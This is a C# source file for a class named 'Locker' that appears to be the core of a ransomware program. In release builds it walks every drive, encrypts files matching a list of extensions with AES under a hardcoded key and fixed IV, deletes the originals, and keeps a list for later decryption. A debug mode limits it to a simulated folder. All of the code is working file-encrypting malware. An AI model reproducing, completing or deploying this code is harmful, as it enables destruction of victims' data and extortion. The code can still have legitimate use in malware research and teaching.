using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Windows.Forms;
using Main.Properties;

namespace Main.Tools
{
    internal static class Locker
    {
        private static readonly string EncryptedFileListPath = Path.Combine(Config.WorkFolderPath, @"EncryptedFileList.txt");

        private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

        private const string EncryptionFileExtension = Config.EncryptionFileExtension;
        private const string EncryptionPassword = Config.EncryptionPassword;

        internal static void EncryptFileSystem()
        {
            var extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
#if DEBUG
            var fileSystemSimulationDirPath = CreateFileSystemSimulation();

            EncryptFiles(fileSystemSimulationDirPath, EncryptionFileExtension, extensionsToEncrypt);
#else
            foreach (var drivePath in DriveInfo.GetDrives().Select(drive => drive.RootDirectory.FullName))
            {
                EncryptFiles(drivePath, EncryptionFileExtension, extensionsToEncrypt);
            }
#endif
            if (!File.Exists(EncryptedFileListPath))
            {
                var stringArray = EncryptedFiles.ToArray();
                File.WriteAllLines(EncryptedFileListPath, stringArray);
            }
        }

        internal static HashSet<string> GetEncryptedFiles()
        {
            var ecf = new HashSet<string>();
            if (File.Exists(EncryptedFileListPath))
            {
                foreach (var path in File.ReadAllLines(EncryptedFileListPath))
                {
                    ecf.Add(path);
                }
            }

            return ecf;
        } 

        /// <summary>
        /// Create the a folder with some junk file.
        /// </summary>
        /// <returns>Returns the path of the folder that is supposed to simulate the file system.</returns>
        private static string CreateFileSystemSimulation()
        {
            var fileSystemSimulationDirPath = Path.Combine(Config.WorkFolderPath, @"FileSystemSimulation");

            if (!Directory.Exists(fileSystemSimulationDirPath))
                Directory.CreateDirectory(fileSystemSimulationDirPath);
            using (TextWriter tw = new StreamWriter(Path.Combine(fileSystemSimulationDirPath, @"TxtTest.txt"), true))
            {
                tw.WriteLine("I am a txt test.");
            }
            using (TextWriter tw = new StreamWriter(Path.Combine(fileSystemSimulationDirPath, @"NotTxtTest.nottxt"), true))
            {
                tw.WriteLine("I am NOT a txt test.");
            }

            return fileSystemSimulationDirPath;
        }

        private static IEnumerable<string> GetExtensionsToEncrypt()
        {
            var extensionsToEncrypt = new HashSet<string>();

            foreach (
                var ext in
                    Resources.ExtensionsToEncrypt.Split(new[] { Environment.NewLine, " " },
                        StringSplitOptions.RemoveEmptyEntries).ToList())
            {
                extensionsToEncrypt.Add(ext.Trim());
            }

            extensionsToEncrypt.Remove(EncryptionFileExtension);

            return extensionsToEncrypt;
        }

        private static IEnumerable<string> GetFiles(string path)
        {
            var queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                try
                {
                    foreach (var subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine(ex);
                }
                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine(ex);
                }
                if (files == null) continue;
                foreach (var t in files)
                {
                    yield return t;
                }
            }
        }

        private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt )
        {
            foreach (var file in
                (from file in GetFiles(dirPath) from ext in extensionsToEncrypt where file.EndsWith(ext) select file)
                    .Select(file => new {file, fi = new FileInfo(file)})
                    .Where(@t => @t.fi.Length < 10000000)
                    .Select(@t => @t.file))
            {
                try
                {
                    if (EncryptFile(file, encryptionExtension))
                    {
                        EncryptedFiles.Add(file);
                    }

                }
                catch
                {
                    // ignored
                }
            }
        }

        internal static void DecryptFiles(string encryptionExtension)
        {
            foreach (var file in GetEncryptedFiles())
            {
                try
                {
                    var ef = file + encryptionExtension;
                    DecryptFile(ef, encryptionExtension);
                    File.Delete(ef);
                    
                }
                catch
                {
                    // ignored
                }
            }
            File.Delete(EncryptedFileListPath);
        }

        private static bool EncryptFile(string path, string encryptionExtension)
        {
            try
            {
                if (Config.StartMode != Config.StartModeType.Debug)
                    if (path.StartsWith(Config.WorkFolderPath, StringComparison.InvariantCulture) || path.StartsWith(@"C:\Windows", StringComparison.InvariantCultureIgnoreCase))
                        return false;

                using (var aes = new AesCryptoServiceProvider())
                {
                    aes.Key = Convert.FromBase64String(EncryptionPassword);
                    aes.IV = new byte[] { 0, 1, 0, 3, 5, 3, 0, 1, 0, 0, 2, 0, 6, 7, 6, 0 };
                    EncryptFile(aes, path, path + encryptionExtension);
                }
            }
            catch
            {
                return false;
            }
            try
            {
                File.Delete(path);
            }
            catch (Exception)
            {
                return false;
            }
            return true;
        }
        private static void DecryptFile(string path, string encryptionExtension)
        {
            try
            {
                if (!path.EndsWith(encryptionExtension))
                    return;
                var decryptedFilePath = path.Remove(path.Length-4);
                using (var aes = new AesCryptoServiceProvider())
                {
                    aes.Key = Convert.FromBase64String(EncryptionPassword);
                    aes.IV = new byte[] { 0, 1, 0, 3, 5, 3, 0, 1, 0, 0, 2, 0, 6, 7, 6, 0 };
                    DecryptFile(aes, path, decryptedFilePath);
                }
            }
            catch
            {
                return;
            }
            try
            {
                File.Delete(path);
            }
            catch (Exception)
            {
                // ignored
            }
        }

        private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
        {
            var buffer = new byte[65536];

            using (var streamIn = new FileStream(inputFile, FileMode.Open))
            using (var streamOut = new FileStream(outputFile, FileMode.Create))
            using (var encrypt = new CryptoStream(streamOut, alg.CreateEncryptor(), CryptoStreamMode.Write))
            {
                int bytesRead;
                do
                {
                    bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                    if (bytesRead != 0)
                        encrypt.Write(buffer, 0, bytesRead);
                }
                while (bytesRead != 0);
            }
        }

        private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
        {
            var buffer = new byte[65536];

            using (var streamIn = new FileStream(inputFile, FileMode.Open))
            using (var streamOut = new FileStream(outputFile, FileMode.Create))
            using (var decrypt = new CryptoStream(streamOut, alg.CreateDecryptor(), CryptoStreamMode.Write))
            {
                int bytesRead;
                do
                {
                    bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                    if (bytesRead != 0)
                        decrypt.Write(buffer, 0, bytesRead);
                }
                while (bytesRead != 0);
            }
        }
    }
}
